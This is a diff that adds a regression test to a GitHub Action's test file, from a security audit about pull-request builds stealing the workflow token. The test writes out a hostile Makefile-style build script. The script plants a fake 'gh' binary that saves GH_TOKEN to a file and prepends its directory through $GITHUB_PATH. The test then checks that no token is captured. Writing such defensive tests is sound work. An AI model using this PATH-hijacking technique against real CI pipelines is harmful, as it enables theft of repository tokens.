@@ -86,3 +86,54 @@ describe.skipIf(!bash)("action.yml: the sticky comment", { timeout: 60_000 }, ()
     expect(r.out).toContain("::warning::could not list the pull request's comments");
   });
 });
+
+/**
+ * Security audit (30 Oct): the PR's `build` runs in the same job as the step that
+ * gets `github-token`. The runner applies what a step writes to $GITHUB_PATH (and
+ * $GITHUB_ENV) to every later step of the job, so the PR's build can put its own
+ * `gh` in front of the real one and receive GH_TOKEN. This test emulates that
+ * runner behaviour (prepending the $GITHUB_PATH lines) between the two steps.
+ * It fails while the token is reachable from the PR's code.
+ */
+describe.skipIf(!bash)("action.yml: the PR's build and the comment token", { timeout: 60_000 }, () => {
+  let work = "";
+  afterEach(() => work && rmSync(work, { recursive: true, force: true }));
+
+  it("the PR's build cannot replace the gh that receives GH_TOKEN", () => {
+    work = mkdtempSync(join(tmpdir(), "ckb-action-token-"));
+    const evil = join(work, "evil");
+    const ghPath = join(work, "github_path");
+    writeFileSync(ghPath, "");
+    writeFileSync(join(work, "comment.md"), "<!-- ckb-cycles-report -->\n");
+    // What a hostile PR puts in its Makefile (the `build` input runs it).
+    const build = [
+      'mkdir -p "$EVIL_DIR"',
+      `printf '#!/usr/bin/env bash\necho "$GH_TOKEN" > "$EVIL_DIR/stolen"\n' > "$EVIL_DIR/gh"`,
+      'chmod +x "$EVIL_DIR/gh"',
+      'echo "$EVIL_DIR" >> "$GITHUB_PATH"',
+    ].join("\n");
+    const base = { ...process.env, EVIL_DIR: evil, GITHUB_PATH: ghPath, RUNNER_TEMP: work, GITHUB_WORKSPACE: work };
+    spawnSync("bash", ["--noprofile", "--norc", "-eo", "pipefail", "-c", stepScript("Report the head")], {
+      encoding: "utf8",
+      env: { ...base, BUILD: build, CONFIG: "cycles.json", CKB_CYCLES: join(work, "none.js") },
+    });
+    // The runner: each $GITHUB_PATH line goes in front of PATH for the later steps.
+    const added = readFileSync(ghPath, "utf8").split("\n").filter(Boolean).reverse();
+    spawnSync("bash", ["--noprofile", "--norc", "-eo", "pipefail", "-c", stepScript("Post the sticky comment")], {
+      encoding: "utf8",
+      env: {
+        ...base,
+        PATH: [...added, process.env.PATH].join(delimiter),
+        GITHUB_REPOSITORY: "o/r",
+        PR: "7",
+        BODY: join(work, "comment.md"),
+        GH_TOKEN: "ghs_workflow_token_with_pull_requests_write",
+      },
+    });
+    let stolen = "";
+    try {
+      stolen = readFileSync(join(evil, "stolen"), "utf8");
+    } catch {}
+    expect(stolen).not.toContain("ghs_workflow_token");
+  });
+});
